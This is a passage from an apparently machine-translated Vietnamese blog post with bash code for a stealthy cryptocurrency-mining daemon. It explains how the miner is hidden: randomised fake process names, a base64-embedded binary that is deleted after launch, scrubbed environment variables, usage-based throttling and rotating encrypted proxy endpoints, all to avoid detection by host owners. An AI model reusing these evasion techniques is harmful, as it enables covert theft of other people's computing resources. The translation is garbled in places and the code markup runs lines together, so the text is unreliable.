            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Các bộ xử lý có sẵn kể từ khi bash<code>v4</code> , chúng giống như các công việc ngoại trừ chúng có tên và bộ mô tả tệp của riêng chúng.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Chúng tôi đang viết một daemon, đây là một quá trình tồn tại lâu dài và chúng tôi đang sử dụng nhiều bộ mô tả tệp, chúng tôi thực sự muốn thực hiện một số thao tác dọn dẹp để tránh phát sinh<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Chức năng này dựa vào<a href=https://ipinfo.io/> ipinfo</a> để xác định khu vực của worker, cho phép điều chỉnh một số logic phụ thuộc vào khu vực,<a href=\assets/posts/geoip.json> geoip.json</a> nhóm các quốc gia thành các khu vực, vì chúng tôi muốn khu vực cấp cao nhất và không quan tâm đến quốc gia cụ thể.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash có hỗ trợ cho các kết nối tcp, bằng cách có một phần trừu tượng<code>/dev/tcp</code> (cũng đối với udp, nhưng hầu hết nó thường bị vô hiệu hóa tại thời điểm xây dựng, vì vậy bạn không thể dựa vào nó). Các tệp này là một thứ bash, chúng không phải là một phần của linux<code>/dev</code> cây.<p>Đáng nói còn có một hệ thống khóa để xử lý đồng thời giữa các lệnh bash. Để cho phép nhiều công việc hoạt động với các khóa, tất cả họ cần phải chia sẻ một bộ mô tả tệp, vì vậy<code>locker</code> mà cũng là một công việc, phải được bắt đầu trước khi các công việc khác muốn sử dụng khóa. Tủ khóa chỉ đơn giản là đọc tiếp<code>stdin</code> đang chờ khóa yêu cầu, phản hồi trên<code>stdout</code> tùy thuộc vào trạng thái boolean hiện tại được lưu trữ trong một biến. Tôi không đảm bảo rằng cách tiếp cận này là không chạy đua, nhưng dường như hoạt động hiệu quả, mặt khác, tôi nhận thấy các trình mô tả tệp không đáng tin cậy lắm, vì tôi nghi ngờ rằng có một số bộ đệm không được xả ở đâu đó xuống<em> đường ống</em> và cuối cùng rơi vào bế tắc (có nghĩa là bạn không thể dựa vào tủ khóa để đưa ra câu trả lời cho bạn mọi lúc).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Dọn sạch rác của bạn ... các chương trình bash phức tạp kết thúc bằng cách sử dụng nhiều biến, và nếu bạn lạm dụng không gian chung, nó sẽ trở nên đầy hơi. Nếu bạn đang sinh sản các công việc shell, chúng kế thừa tất cả môi trường (được sao chép một cách hiệu quả, không được chia sẻ), bạn có thể nhanh chóng kết thúc với việc ăn bash<code>100M</code> của bộ nhớ, không tốt đẹp. Ngoài ra, chúng tôi thực sự muốn có cấu hình thấp. Trong kịch bản triển khai của chúng tôi, đối thủ<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> có thể có quyền truy cập root và thông tin đầy đủ về các quy trình của chúng tôi<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> và bạn biết đấy ... mọi quy trình đều chứa thông tin về lệnh đầy đủ đã khởi chạy nó và các biến môi trường đã xuất.<h2 id=configuration><a class=header-anchor href=#configuration> Cấu hình</a></h2><p>Khi chúng ta có môi trường và các công cụ của mình, chúng ta phải điều chỉnh trình khai thác của mình cho máy mà nó đang chạy, các bước cấu hình trong mã giả:<ul><li><p>tên quy trình cho người khai thác<li><p>thông tin máy chủ (ram / lõi / bộ nhớ đệm /<code>ENV_VARS</code>)<li><p>phiên bản cấu hình<li><p><code>worker_id</code> cho người khai thác (từ ip và máy chủ)<li><p>ip / cổng cho kết nối</ul><p>Chọn tên cho quy trình là bắt buộc<em> ẩn giấu</em> thực tế là chúng tôi đang chạy một công cụ khai thác, nhưng chúng tôi không chỉ đổi tên tệp nhị phân của mình, chúng tôi có một danh sách<strong> mặt nạ</strong> cho các ứng viên tiềm năng (một tệp văn bản thuần túy trong đó mỗi dòng là một mặt nạ):<ul><li><p>chọn một chiếc mặt nạ một cách ngẫu nhiên<li><p>xáo trộn các phần tử của phần đuôi của chuỗi (tất cả ngoại trừ phần đầu tiên) để nhận được một lệnh xử lý đa dạng. Bây giờ chúng ta có một chuỗi trông giống như<code>cmd --arg2 --arg1 --arg3</code> . Đây là mặt nạ khai thác của chúng tôi, chúng tôi chạy nhị phân<em> không có</em> nhưng có vẻ như chúng ta đã bắt đầu một lệnh<code>cmd</code> với các đối số<code>--arg1 --arg2 --arg3</code> . Dấu cách và dấu gạch ngang được cho phép trong tên tệp, vì vậy bạn có thể chạy một tệp nhị phân có tên như thế này, có vẻ như linux không phân biệt giữa tệp thực thi và các đối số khi lưu trữ các lệnh tiến trình.<p>Cấu hình công cụ khai thác được tải tự động từ<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Tỷ lệ hỏng hóc</a></h3><p>, cùng với thời gian, người khai thác thượng nguồn có nhiều<strong> điều chỉnh tự động</strong> các tính năng, vì vậy nó đã làm cho một phần tập lệnh của tôi trở nên thừa, nhưng sự khác biệt giữa ngược dòng và hạ lưu ở đây là mục tiêu ngược dòng là tối đa hóa<em> màn biểu diễn</em> , trong khi mục tiêu của chúng tôi là tối đa hóa<em> hiệu quả và sự xáo trộn</em> , chúng tôi không muốn vượt qua hệ thống, chúng tôi muốn phát triển một chút mà không bị gián đoạn dịch vụ.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Đối với điều này, chúng ta cần hiểu biết chi tiết hơn về môi trường,<code>l2/l3</code> cấu trúc bộ nhớ cache của bộ xử lý, ram và lõi và bộ xử lý hiện tại<em> Trung bình</em> tải và cpu<em> sử dụng</em>. Tôi đã cố gắng xây dựng một<a href=https://en.wikipedia.org/wiki/Finite-state_machine> máy nhà nước</a> trong bash sẽ bắt đầu từ mức tối thiểu trần và thử các cấu hình khác nhau từ từ giải quyết ở mức trung bình tốt nhất. Nó là một<strong> khổng lồ</strong> lãng phí nỗ lực rải rác với<a href=https://en.wikipedia.org/wiki/Technical_debt> nợ kỹ thuật</a> đã phá sản rất nhanh và hầu hết đã bị loại bỏ, chỉ còn lại những phần còn sót lại trong cơ sở mã.<p>Frack tất cả jumbo tự động điều chỉnh này, chúng tôi chỉ làm cho người khai thác ở chế độ ngủ tùy thuộc vào việc sử dụng / tải máy chủ, điều này bắt buộc phải sửa đổi cho người khai thác để<code>sleep</code> giữa các luồng sản lượng và một số bản sửa lỗi cho cơ quan giám sát cấu hình<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , điều này sẽ cho phép chúng tôi tải lại lượng ngủ trong thời gian chạy. Logic được đơn giản hóa hơn nhiều và trông như thế này:<ul><li><p>nếu mức sử dụng trên / dưới $ TARGET_USAGE (± sai số), hãy tăng / giảm chế độ ngủ<li><p>nếu tải trung bình trong<code>1m</code> trên / dưới $ TARGET_LOAD tạm dừng / tiếp tục khai thác</ul><h3 id=connection><a class=header-anchor href=#connection> Sự liên quan</a></h3><p>Trong phần tổng hợp bash của chúng tôi, chúng tôi đã trình bày các tiện ích cho kết nối. Tại sao chúng ta cần những thứ này? Bởi vì chúng ta cần sự đa dạng; chỉ đơn giản là mã hóa cứng một điểm cuối vào cấu hình sẽ không tồn tại lâu, khi có điều gì đó đáng ngờ và có hoạt động mạng, IP sẽ bị gắn cờ.<p>Khi bắt đầu, chúng tôi đã thử nghiệm với một số phương pháp:<ul><li><p>sử dụng<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> móc khóa</a> để làm quá tải các cuộc gọi mạng của người khai thác, nhưng nó yêu cầu người khai thác phải được xây dựng với các thư viện di động và bạn phải gửi chúng cùng với trọng tải, vì vậy điều đó là không thực tế.<li><p>chạy một<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> đường hầm phía trước</a> sát cánh với người khai thác: điều này có rất nhiều chi phí cấu hình, vì bây giờ chúng tôi đang định cấu hình hai quy trình trên mỗi lần triển khai, điều này dẫn đến nhiều lỗi hơn.</ul><p>Cuối cùng, chúng tôi giải quyết bằng cách chỉ gửi một danh sách các điểm cuối, được lưu trữ trong một biến cơ sở, chọn một cách ngẫu nhiên. Tất nhiên, các kết nối đã được mã hóa. Những điểm cuối này là gì? Người chuyển tiếp tới proxy sẽ xử lý các công việc của thợ đào.<p>Tại sao chúng ta cần một<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proxy khai thác</a> ? Tôi chưa bao giờ thực sự vượt qua ~ 100 kết nối đồng thời, vì vậy proxy không thực sự cần thiết cho tải mạng, nhưng nó thuận tiện cho việc thương lượng thuật toán băm và cung cấp các mục tiêu độ khó khác nhau cho các thợ đào khác nhau, để ngăn chặn các thợ đào làm việc<strong> khó khăn</strong> các mục tiêu sẽ khiến họ mất quá nhiều thời gian để hoàn thành và tránh nguy cơ lãng phí tính toán cho những công việc chưa hoàn thành.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Phần mềm pool cũng yêu cầu một số sửa đổi vì nó rất vui khi được quảng cáo là một proxy cho các yêu cầu http đơn giản ...<em> điều đó đã được hết thời gian</em> và một ngã ba đã thêm kiểm soát truy cập để chúng tôi dựa trên các mod của mình trên đó.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Chỉnh sửa json</a></h3><p>Áp dụng các sửa đổi cho tệp json chỉ với bash mà chúng tôi đã có với một số thay thế env var và một số regex. Ban đầu chúng tôi dựa vào một<code>envsubst</code> nhị phân để áp dụng các biến, sau đó chúng tôi đã hoàn thành<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> với logic này:<ul><li><p>đọc mẫu cấu hình<li><p>thay thế tất cả các dấu ngoặc kép bằng một chuỗi rất bí truyền (như<code>_#_#</code>)<li><p><code>eval</code> bản mẫu<li><p>thay thế tất cả các sự kiện bí truyền trở lại bằng dấu ngoặc kép</ul><p>Ngoài việc tránh các quy trình phụ, một lợi thế khác là chúng tôi có được khả năng bash hoàn chỉnh trong các mẫu của mình. Để đọc và viết không có mẫu, chúng ta phải dựa vào khả năng của bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Điều này chỉ cho phép chúng tôi chỉnh sửa các dòng đơn, đối với các mục nhập nhiều dòng, nó chỉ xem xét dòng đầu tiên..nhưng nó đủ tốt cho trường hợp sử dụng của chúng tôi.<h2 id=runtime><a class=header-anchor href=#runtime> Thời gian chạy</a></h2><p>Thời gian chạy của chúng ta trông như thế nào? Chúng ta có một quy trình bash chính thực thi vòng lặp chính, sau đó là quy trình phụ của người khai thác, quy trình phụ của bộ giám sát cpu, bộ khóa và bộ điều chỉnh. Đó gần như là một số ít.<p>Trước tiên, chúng tôi muốn đảm bảo rằng nếu có sự cố xảy ra, chúng tôi sẽ không để lại một mớ hỗn độn, điều này có nghĩa là chúng tôi sử dụng bẫy bash để thực hiện dọn dẹp khi chấm dứt<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> gỡ bẫy để ngăn chặn đệ quy. Cái bẫy giết chết tất cả các công việc và loại bỏ môi trường làm việc.<p>Đã đến lúc khởi động trình khai thác, được lưu trữ dưới dạng biến bash trong mã hóa base64. Chúng tôi kết xuất nó trên hệ thống tệp, sau đó chúng tôi kết xuất cấu hình, thực thi trình khai thác và xóa cả trình khai thác và cấu hình. Trên linux, bạn có thể xóa tệp thực thi của một tiến trình đang chạy, (trên windows, điều này không được phép).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Khi công cụ khai thác đang chạy, trên hệ thống tệp chỉ có một<code>.. /</code> thư mục với một<code>b64</code> liên kết trong đó.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Một vấn đề khó hiểu gặp phải với bash trong khi mã hóa trình khai thác là gán một biến với vỏ con kèm theo dấu ngoặc kép<code>myvar="$(something)"</code> gây ra sự gia tăng vĩnh viễn trong việc sử dụng bộ nhớ, điều này rất khó để gỡ lỗi và chưa thực sự tìm ra lý do tại sao lại hoạt động như vậy, dù sao thì bài tập cũng phải được hủy trích dẫn. Thay vào đó, giải mã được thực hiện với<em> câu chuyện</em> là một sự trừu tượng hóa trên các tệp tạm thời, biến được kết xuất vào một tệp sau đó được đưa trở lại quy trình.<p>Vòng lặp chạy dài của thợ mỏ:<ul><li><p>trong khi đúng<ul><li><p>dừng thợ mỏ<li><p>loại bỏ cấu hình<li><p>bắt đầu khai thác<li><p>trong khi đúng<ul><li><p>bắt đầu daemon<ul><li><p>trong khi thợ đào đang chạy<ul><li><p>đọc kết quả từ người khai thác<li><p>chọn hành động của người khai thác dựa trên dòng đầu ra</ul></ul><li><p>nếu công cụ khai thác không chạy: break</ul><li><p>ngủ</ul></ul><p>Dòng đầu ra được so khớp với một số regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Daemon xử lý các trường hợp<ul><li><p>kết nối với điểm cuối gây ra lỗi (chọn một điểm cuối ngẫu nhiên mới)<li><p>thuật toán băm thay đổi (điều chỉnh thời gian ngủ và cấu hình đặc biệt)<li><p>sự cố máy khai thác (khởi động lại máy khai thác).</ul><p>Trong một thời gian, đã có hỗ trợ cho bảng điều khiển và lệnh, cho phép kích hoạt khởi động lại thủ công, tuy nhiên vì việc sử dụng nó là tối thiểu nên nó đã bị loại bỏ và các điểm cuối của nó được thay thế bằng kết nối nhóm thay thế, quá trình khởi động lại cũng không ổn định, phức tạp. .. một ví dụ khác về nợ công nghệ. Tuy nhiên, nó cho phép tải lại tải trọng cập nhật và thiết 